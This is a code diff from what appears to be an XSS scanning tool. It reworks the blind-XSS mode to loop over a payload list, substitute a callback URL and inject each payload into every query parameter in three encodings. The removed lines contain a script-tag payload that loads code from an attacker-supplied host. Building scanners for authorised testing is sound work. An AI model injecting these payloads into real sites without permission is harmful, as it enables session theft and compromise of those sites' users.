@@ -256,19 +256,25 @@ func Scan(target string, optionsStr map[string]string, optionsBool map[string]bo
 		if optionsStr["blind"] != "" {
 			spu, _ := url.Parse(target)
 			spd := spu.Query()
+			bpayloads := getBlindPayload()
+			// loop parameter list
 			for spk := range spd {
-				// Add plain XSS Query
-				tq, tm := optimization.MakeRequestQuery(target, spk, "\"'><script src="+optionsStr["blind"]+"></script>", "toBlind", optionsStr)
-				tm["payload"] = "toBlind"
-				query[tq] = tm
-				// Add URL encoded XSS Query
-				etq, etm := optimization.MakeURLEncodeRequestQuery(target, spk, "\"'><script src="+optionsStr["blind"]+"></script>", "toBlind", optionsStr)
-				etm["payload"] = "toBlind"
-				query[etq] = etm
-				// Add HTML Encoded XSS Query
-				htq, htm := optimization.MakeHTMLEncodeRequestQuery(target, spk, "\"'><script src="+optionsStr["blind"]+"></script>", "toBlind", optionsStr)
-				htm["payload"] = "toBlind"
-				query[htq] = htm
+				// loop payload list
+				for _, bpayload := range bpayloads {
+					// Add plain XSS Query
+					bp := strings.Replace(bpayload, "CALLBACKURL", optionsStr["blind"], 10)
+					tq, tm := optimization.MakeRequestQuery(target, spk, bp, "toBlind", optionsStr)
+					tm["payload"] = "toBlind"
+					query[tq] = tm
+					// Add URL encoded XSS Query
+					etq, etm := optimization.MakeURLEncodeRequestQuery(target, spk, bp, "toBlind", optionsStr)
+					etm["payload"] = "toBlind"
+					query[etq] = etm
+					// Add HTML Encoded XSS Query
+					htq, htm := optimization.MakeHTMLEncodeRequestQuery(target, spk, bp, "toBlind", optionsStr)
+					htm["payload"] = "toBlind"
+					query[htq] = htm
+				}
 			}
 			printing.DalLog("SYSTEM", "Added your blind XSS ("+optionsStr["blind"]+")", optionsStr)
 		}
